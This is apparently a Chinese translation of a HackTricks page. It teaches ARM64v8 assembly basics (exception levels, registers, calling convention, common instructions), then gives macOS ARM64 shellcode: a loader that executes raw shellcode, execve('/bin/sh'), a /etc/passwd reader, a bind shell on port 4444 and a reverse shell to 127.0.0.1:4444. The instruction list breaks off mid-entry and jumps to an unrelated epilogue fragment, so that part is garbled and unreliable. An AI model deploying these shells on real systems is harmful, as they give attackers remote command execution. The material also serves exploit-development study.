# ARM64v8基础汇编简介

<details>

<summary><strong>从零到英雄学习AWS黑客技术，就用</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter**上**关注**我 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## **异常级别 - EL (ARM64v8)**

在ARMv8架构中，执行级别，称为异常级别（ELs），定义了执行环境的权限级别和能力。有四个异常级别，从EL0到EL3，每个级别都有不同的用途：

1. **EL0 - 用户模式**：
* 这是最低权限级别，用于执行常规应用程序代码。
* 在EL0运行的应用程序彼此隔离，与系统软件隔离，增强了安全性和稳定性。
2. **EL1 - 操作系统内核模式**：
* 大多数操作系统内核在此级别运行。
* EL1比EL0拥有更多权限，并且可以访问系统资源，但有一些限制以确保系统完整性。
3. **EL2 - 虚拟机监控器模式**：
* 此级别用于虚拟化。在EL2运行的虚拟机监控器可以管理在同一物理硬件上运行的多个操作系统（每个都在自己的EL1中）。
* EL2提供了隔离和控制虚拟化环境的功能。
4. **EL3 - 安全监控器模式**：
* 这是最高权限级别，通常用于安全启动和可信执行环境。
* EL3可以管理和控制安全和非安全状态之间的访问（如安全启动、可信操作系统等）。

使用这些级别可以结构化和安全地管理系统的不同方面，从用户应用程序到最高权限的系统软件。ARMv8对权限级别的处理有助于有效隔离系统的不同组件，从而增强了系统的安全性和健壮性。

## **寄存器 (ARM64v8)**

ARM64有**31个通用寄存器**，标记为`x0`至`x30`。每个可以存储**64位**（8字节）的值。对于只需要32位值的操作，可以使用w0至w30的名称以32位模式访问相同的寄存器。

1. **`x0`**至**`x7`** - 这些通常用作临时寄存器和传递子程序参数。
* **`x0`**还携带函数的返回数据
2. **`x8`** - 在Linux内核中，`x8`用作`svc`指令的系统调用号。**在macOS中使用的是x16！**
3. **`x9`**至**`x15`** - 更多临时寄存器，常用于局部变量。
4. **`x16`**和**`x17`** - **过程内调用寄存器**。临时寄存器，用于立即值。它们也用于间接函数调用和PLT（过程链接表）存根。
* **`x16`**在**macOS**中用作**`svc`**指令的**系统调用号**。
5. **`x18`** - **平台寄存器**。可以用作通用寄存器，但在某些平台上，此寄存器保留用于特定于平台的用途：在Windows中指向当前线程环境块的指针，或在linux内核中指向当前**执行任务结构**的指针。
6. **`x19`**至**`x28`** - 这些是被调用者保存的寄存器。函数必须为其调用者保留这些寄存器的值，因此它们存储在栈中，并在返回调用者之前恢复。
7. **`x29`** - **帧指针**，用于跟踪栈帧。当因调用函数而创建新的栈帧时，**`x29`**寄存器会**存储在栈中**，新的帧指针地址（**`sp`**地址）会**存储在此寄存器中**。
* 这个寄存器也可以用作**通用寄存器**，尽管它通常用作**局部变量**的参考。
8. **`x30`**或**`lr`**- **链接寄存器**。当执行`BL`（带链接的分支）或`BLR`（带链接到寄存器的分支）指令时，它保存**返回地址**，通过将**`pc`**值存储在此寄存器中。
* 它也可以像其他寄存器一样使用。
9. **`sp`** - **栈指针**，用于跟踪栈顶。
* **`sp`**值应始终至少保持**四字对齐**，否则可能发生对齐异常。
10. **`pc`** - **程序计数器**，指向当前指令。此寄存器只能通过异常生成、异常返回和分支来更新。唯一可以读取此寄存器的普通指令是带链接的分支指令（BL、BLR），以将**`pc`**地址存储在**`lr`**（链接寄存器）中。
11. **`xzr`** - **零寄存器**。在其**32**位寄存器形式中也称为**`wzr`**。可以用来轻松获取零值（常见操作）或使用**`subs`**进行比较，如**`subs XZR, Xn, #10`**，将结果存储在无处（在**`xzr`**中）。

**`Wn`**寄存器是**`Xn`**寄存器的**32位**版本。

### SIMD和浮点寄存器

此外，还有另外**32个128位长度的寄存器**，可用于优化的单指令多数据（SIMD）操作和执行浮点运算。这些被称为Vn寄存器，尽管它们也可以以**64**位、**32**位、**16**位和**8**位操作，然后它们被称为**`Qn`**、**`Dn`**、**`Sn`**、**`Hn`**和**`Bn`**。

### 系统寄存器

**有数百个系统寄存器**，也称为特殊用途寄存器（SPRs），用于**监控**和**控制** **处理器**行为。\
它们只能使用专用的特殊指令**`mrs`**和**`msr`**读取或设置。

特殊寄存器**`TPIDR_EL0`**和**`TPIDDR_EL0`**在逆向工程中常见。`EL0`后缀表示可以访问寄存器的**最小异常**级别（在这种情况下，EL0是常规程序运行的常规异常（权限）级别）。\
它们通常用于存储线程局部存储区域的内存的**基地址**。通常第一个对EL0中运行的程序可读写，但第二个可以从EL0读取并从EL1（如内核）写入。

* `mrs x0, TPIDR_EL0 ; 将TPIDR_EL0读入x0`
* `msr TPIDR_EL0, X0 ; 将TPIDR_EL0写入x1`

### **PSTATE**

**PSTATE**是几个组件序列化到操作系统可见的**`SPSR_ELx`**特殊寄存器中。这些是可访问的字段：

* **`N`**、**`Z`**、**`C`**和**`V`**条件标志：
* **`N`**表示操作产生了负结果
* **`Z`**表示操作产生了零
* **`C`**表示操作产生了进位
* **`V`**表示操作产生了有符号溢出：
* 两个正数相加产生负结果。
* 两个负数相加产生正结果。
* 在减法中，当一个大的负数从一个较小的正数（或相反）中减去，并且结果不能在给定位大小的范围内表示时。
* 当前**寄存器宽度（`nRW`）标志**：如果标志值为0，程序恢复后将以AArch64执行状态运行。
* 当前**异常级别**（**`EL`**）：在EL0中运行的常规程序将有值0
* **单步执行**标志（**`SS`**）：调试器通过在**`SPSR_ELx`**中通过异常将SS标志设置为1来单步执行。程序将运行一步并发出单步异常。
* **非法异常**状态标志（**`IL`**）：当特权软件执行无效的异常级别转移时，此标志设置为1，处理器触发非法状态异常。
* **`DAIF`**标志：这些标志允许特权程序选择性地屏蔽某些外部异常。
* **栈指针选择**标志（**`SPS`**）：在EL1及以上运行的特权程序可以在使用自己的栈指针寄存器和用户模式的栈指针寄存器之间切换（例如，在`SP_EL1`和`EL0`之间）。通过写入**`SPSel`**特殊寄存器来执行此切换。这不能从EL0完成。

<figure><img src="../../../.gitbook/assets/image (724).png" alt=""><figcaption></figcaption></figure>

## **调用约定 (ARM64v8)**

ARM64调用约定规定，函数的**前八个参数**通过寄存器**`x0`至`x7`**传递。**额外**的参数通过**栈**传递。**返回**值通过寄存器**`x0`**返回，如果是128位的话，也可以通过**`x1`**返回。**`x19`**至**`x30`**和**`sp`**寄存器必须在函数调用中保持不变。

阅读汇编中的函数时，寻找**函数序言和尾声**。**序言**通常涉及**保存帧指针（`x29`）**，**设置新的帧指针**，和**分配栈空间**。**尾声**通常涉及**恢复保存的帧指针**和**从函数返回**。

### Swift中的调用约定

Swift有其自己的**调用约定**，可以在[**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)找到

## **常见指令 (ARM64v8)**

ARM64指令通常具有**格式`opcode dst, src1, src2`**，其中**`opcode`**是要执行的**操作**（如`add`、`sub`、`mov`等），**`dst`**是将存储结果的**目标**寄存器，**`src1`**和**`src2`**是**源**寄存器。立即数也可以代替源寄存器使用。

* **`mov`**: **移动**一个值从一个**寄存器**到另一个。
* 示例：`mov x0, x1` — 这将`x1`中的值移动到`x0`中。
* **`ldr`**: **从内存加载**一个值到**寄存器**中。
* 示例：`ldr x0, [x1]` — 这将从`x1`指向的内存位置加载一个值到`x0`中。
* **`str`**: **将寄存器中的值存储**到**内存**中。
* 示例：`str x0, [x1]` — 这将`x0`中的值存储到`x1`指向的内存位置中。
* **`ldp`**: **加载寄存器对**。此指令**从连续的内存位置加载两个寄存器**。内存地址通常通过向另一个寄存器的值添加偏移量来形成。
* 示例：`ldp x0, x1, [x2]` — 这将从`x2`和`x2 + 8`的内存位置加载`x0`和`x1`。
* **`stp`**: **存储寄存器对**。此指令**将两个寄存器存储到连续的内存位置**。内存地址通常通过向另一个寄存器的值添加偏移量来形成。
* 示例：`stp x0, x1, [x2]` — 这将`x0`和`x1`存储到`x2`和`x2 + 8`的内存位置。
* **`add`**: **将两个寄存器的值相加**并将结果存储在寄存器中。
* 示例：`add x0, x1, x2` — 这将`x1`和`x2`中的值相加并将结果存储在`x0`中。
* **`sub`**: **从一个寄存器中减去另一个寄存器的值**并将结果存储在寄存器中。
* 示例：`sub x0, x1, x2` — 这将`x2`中的值从`x1`中减去并将结果存储在`x0`中。
* **`mul`**: **将两个寄存器的值相乘**并将结果存储在寄存器中。
* 示例：`mul x0, x1, x2` — 这将`x1`和`x2`中的值相乘并将结果存储在`x0`中。
* **`div`**: **将一个寄存器的值除以另一个**并将结果存储在寄存器中。
* 示例：`div x0, x1, x2` — 这将`x1`中的值除以`x2`并将结果存储在`x0`中。
* **`bl`**: **带链接的分支**，用于**调用**一个**子程序
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
{% endcode %}

3. **返回**: `ret`（使用链接寄存器中的地址将控制权返回给调用者）

## AARCH32 执行状态

Armv8-A 支持执行 32 位程序。**AArch32** 可以在 **两种指令集**中运行：**`A32`** 和 **`T32`**，并且可以通过 **`交互操作`** 在它们之间切换。\
**特权** 64 位程序可以通过执行一个异常级别转移来安排**执行 32 位**程序，转移到较低特权的 32 位。\
请注意，从 64 位转到 32 位的转换伴随着异常级别的降低（例如，EL1 中的 64 位程序触发 EL0 中的程序）。这是通过在 `AArch32` 进程线程准备执行时将 **`SPSR_ELx`** 特殊寄存器的 **第 4 位** **设置为 1**，而 `SPSR_ELx` 的其余部分存储 **`AArch32`** 程序的 CPSR 来完成的。然后，特权进程调用 **`ERET`** 指令，使处理器转换到 **`AArch32`**，根据 CPSR 进入 A32 或 T32**。**

## macOS

### BSD 系统调用

查看 [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master)。BSD 系统调用将有 **x16 > 0**。

### Mach 陷阱

查看 [**syscall\_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall\_sw.c.auto.html)。Mach 陷阱将有 **x16 < 0**，所以你需要用 **负数** 来调用前面列表中的数字：**`_kernelrpc_mach_vm_allocate_trap`** 是 **`-10`**。

你也可以在反汇编器中检查 **`libsystem_kernel.dylib`**，找到如何调用这些（以及 BSD）系统调用：
```bash
# macOS
dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e

# iOS
dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
```
{% hint style="success" %}
有时候检查 **`libsystem_kernel.dylib`** 中的**反编译**代码比检查**源代码**要容易，因为许多系统调用（BSD和Mach）的代码是通过脚本生成的（检查源代码中的注释），而在dylib中你可以找到正在被调用的内容。
{% endhint %}

### Shellcodes

编译方法：
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
提取字节：
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
<details>

<summary>C代码测试shellcode</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

取自[**这里**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s)并进行了解释。

{% tabs %}
{% tab title="使用 adr" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{% endtab %}

{% tab title="带栈" %}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{% endtab %}
{% endtabs %}

#### 使用 cat 读取

目标是执行 `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)`，因此第二个参数（x1）是参数数组（在内存中，这意味着地址的堆栈）。
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### 通过 fork 调用 sh 命令，这样主进程不会被终止
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### 绑定 Shell

绑定 Shell 来自 [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) 在 **端口 4444**上
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### 反向 shell

来自 [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s)，revshell 至 **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>从零开始学习AWS黑客攻击直至成为专家，通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
